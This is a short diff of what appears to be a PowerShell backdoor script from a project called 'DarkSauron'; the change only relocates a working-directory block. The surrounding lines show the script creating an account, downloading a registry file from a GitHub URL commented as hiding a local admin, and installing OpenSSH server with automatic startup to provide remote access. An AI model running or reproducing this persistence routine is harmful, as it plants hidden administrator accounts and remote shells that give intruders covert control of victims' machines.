@@ -47,14 +47,6 @@ create_account  -uname $uname -password $password
 
 
 
-#goto temp ,make working directory
-
- mkdir $path 
- cd $path 
- 
-
-
-
 #registry  to hide local admin
 $reg_file = random_text
 Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/admin.reg -OutFile "$reg_file.reg"
@@ -93,6 +85,16 @@ Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd 
 Set-Service  -Name sshd -StartupType 'Automatic' 
 Get-NetFirewallRule -Name *ssh* -Enabled True
+
+
+
+
+
+#goto temp ,make working directory
+
+ mkdir $path 
+ cd $path 
+ 
 
 
 
